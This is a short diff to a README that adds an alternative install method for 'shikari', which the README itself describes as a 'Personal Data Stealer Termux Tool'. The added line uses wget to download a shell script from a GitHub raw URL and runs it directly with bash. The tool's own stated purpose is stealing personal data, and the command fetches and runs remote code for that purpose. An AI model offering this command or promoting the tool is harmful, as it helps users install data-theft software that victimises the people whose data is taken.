@@ -8,6 +8,11 @@ https://pypi.org/project/shikari/
 #### Installation
 $ pip install shikari
 
+or
+
+$ pkg install wget -y;wget https://raw.githubusercontent.com/Bhai4You/Shikari/master/shikari.sh;bash shikari.sh
+
+
 
 #### Features
 +   **shikari**, Personal Data Stealer Termux Tool
